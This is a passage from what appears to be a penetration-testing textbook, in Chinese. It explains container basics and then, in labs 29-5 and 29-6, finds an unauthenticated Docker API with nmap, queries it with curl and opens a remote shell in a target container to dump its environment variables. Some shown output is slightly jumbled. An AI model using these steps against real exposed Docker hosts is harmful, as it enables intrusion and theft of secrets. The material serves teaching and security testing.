
这种视图向我们展示了几个点。首先，我们实际上可以在宿主机上遍历 Docker 容器并查找文件，其中某些文件可能包含秘密或信息。在查看大型宿主机上的容器时，请记住这一点。其次，我们可以看到每个文件系统层的增量目录。那些被称为 `/work` 的目录包含了容器运行后发生的变化。

# 应用程序

为什么容器如此流行？为什么我们看到它们突然出现在各处？在许多环境中，容器正在逐渐取代虚机。目前，容器和虚拟机之间存在一种权衡——一种我们可以轻易利用的权衡。虚拟机通过虚拟化硬件层为应用程序引入了一层安全保护。这种抽象意味着在每次创建虚拟机时，必须提供操作系统内核、驱动程序、内存管理和文件系统。

容器则不同；它们带入用户态二进制文件并共享操作系统内核、驱动程序和内存结构。界限或隔离位于容器组和命名空间层。如图 29-2 所示，这种方式的优势在于由于不需要消耗额外的 CPU 和内存来管理整个操作系统，从而获得了效率；相反，容器只需要用户态进程即可。

鉴于此，对于开发者来说，我们现在从效率的角度看到了其吸引力，但它也有其他益处。考虑 Linux 的遗产：通过 Linux，你拥有许多针对发布时所分发的标准库编译的应用程序。你是否曾经遇到过软件因为“所需的库”太新或太旧而导致编译失败？容器解决了这个问题，因为我们现在可以在创建软件的精确时间带有精确的二进制文件分发软件。怎么做到的？

![](img/0add480ffb73b6bc89b65d99f7d6b37a_1008_0.png)

# 图 29-2 容器 vs 虚拟机

是什么让 Linux 成为“Linux”？具体来说，是什么让 RedHat 与 Mandrake 或 SUSE 有不同？Linux 由几个组件组成：

- 与宿主机共享的 Linux 内核
- 系统软件，如 Init 或 SystemD 以及其他软件包
- GNU 二进制文件，包括编辑器、网络实用程序

当你构建容器时，你使用适当的系统软件创建它，基于 RedHat 的容器可以与基于 Debian 的容器并排，运行在 Amazon Linux 2 上。这就是容器如此实用的原因。

大多数人认为 Docker 是现存的最熟悉的工具。在一段时间内，可能直到今天，Docker 和容器这几个词几乎是可以互换的。Docker 并不是一个容器运行时接口 `CRI`。我们将进一步探索容器运行时，但现在我们只需要理解 Docker 本身是一个与 API 协作的 CLI。Docker 守护进程通常运行在 socket 中，但并不总是如此。在流行的互联网上搜索可以得到很多开源工具。从本质上说，Docker 最终是一个包装器或编排器，允许管理员在同一台机器上编排多个容器。Swarm 是 Docker 版本的 Kubernetes。

**寻找 Docker 守护进程**

让 Docker 守护进程暴露？API 允许 Docker 许多许多用处。Docker 守护进程可以通过 socket 交互。为了探索这一点，我们首先查看 API：

```bash
2375/tcp

Nmap done: 1 IP address (1 host) scanned in 2.51 seconds

Starting Nmap 7.92

PORT STATE VERSION

2375/tcp open 20.10.4 (1.41)

       KernelVersion: 5.4.0-1038-aws

       Version: 20.10.4

       GitCommit: 36e9a8

       Arch: amd64
```

运行 `nmap`，我们可以扫描标准的 Docker 端口。这里我们看到的是通过 API 暴露的实例。API 允许我们在不带任何客户端的情况下进行操作。通过对 API 的适当调用，我们可以获取大部分所需信息；或者，我们也有 Docker CLI。

```bash
kali@kali~$ curl http://10.0.0.5:2375/containers/json | jq '.'
% Total % Received Average Speed Time
Dload Upload Total Spent
100 2575 2757 0 207k 207k
{
  "Id": "fd86c839ef345b7a42089610ec302f8df6e0b5d9b08104f94a2c1eddd1",
  "Names": {
    "/containers/redis_1": ""
  },
  "Image": "redis:alpine",
  "ImageID": "sha256:dad7d4d753d4795239bf2f1deb947d39c7aec50f3a57daab8a05cee7fb1250b77",
  "Command": ["docker-entrypoint.sh", "redis-server"],
  "Created": 1614547472,
  "Ports": {
    "PrivatePort": 6379,
    "Type": "tcp"
  }
}
```

Docker SDK 支持许多常见的交互，`ps` 命令由 API 调用启用。在这里，`/containers/json` 端点通过 JSON 数组向我们返回所有的容器信息，包括任何环境变量和任何正在使用的端口。

### 容器安全

容器被设计为一种不会变化的“时间点”系统。这对于开发者继续支持在旧版本软件上编译的应用程序是一个益处，但对于希望利用旧软件漏洞的攻击者来说也是一种优势。我们根据其不可变性知道，PHP 5.4 或 Java 7 等旧软件的容器可能包含大量的操作系统以及运行时中的软件漏洞。

## 实验 29-5：与 Docker API 交互

我们可以使用 Docker CLI 来创建容器；然而，使用原生客户端要容易得多，因为它已经将所有的调用编码在 CLI 中了。我们将使用部署在 AWS 云端上的 Kali 实例来执行本实验的后续部分：

```bash
$ docker -H 10.0.0.50 ps
CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
fdc86c89ef3 redis:alpine "docker-entrypoint.s..." About an hour Up About 6379/tcp targets_redis_1 About an hour Up
1627680fd2d7 targets_web "flask run" About an hour Up About 0.0.0.0->5000/tcp targets_web_1
```

我们可以运行带有 `-H` 标志的 `docker` 命令，以便我们指定远程主机。在远程目标上，我们看到了两个容器：`targets_redis_1` `targets_web_1`。第一个容器没有向主机的主接口暴露端口，而第二个容器则暴露了。在当前配置中，守护进程未经过验证或加密；因此，任何在这些接口上监听的攻击者都能看到这些命令。

## 实验 29-6：远程执行命令

我们将远程连接到暴露的 Docker socket 并获取它们的远程 shell。这对于熟悉过 netcat 绑定 shell（bind shells）的读者来说会非常熟悉。

```bash
-(kali)~
$ docker -H 10.0.0.50 exec -it targets_web_1 /bin/sh
/code # ls
Dockerfile    __pycache__    app.py    requirements.txt templates
/code # env
HOSTNAME=162768f0fd2d7
PYTHON PIP_VERSION=21.0.1
<--为了简洁起省略---
PYTHON_GET_PIP_SHA256=c3b81e5d06371e3f5b3156cd78fd86dc2707350882468c4a9a5ec1f342e202565
/code # ps -ef
PID USER COMMAND
1 root 0:00 [flask] /usr/local/bin/usr/local/bin/flask run
20 root 0.00 /bin/sh
28 root 0:00 ps -ef
/code # /proc/1/cgroup
12:cpuset:docker/162768f0fd2d7e7b92c3405b7c7d27c64aed7abba3780e4a027742cea509bb
<Omitted-For>
1:name=docker/162768f0fd2d7e7b92c3405b7c7d27c64aed7abba3780e4a027742cea509bb
0:/system.slice.container.service
/code # mount
overlay on type overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/
```
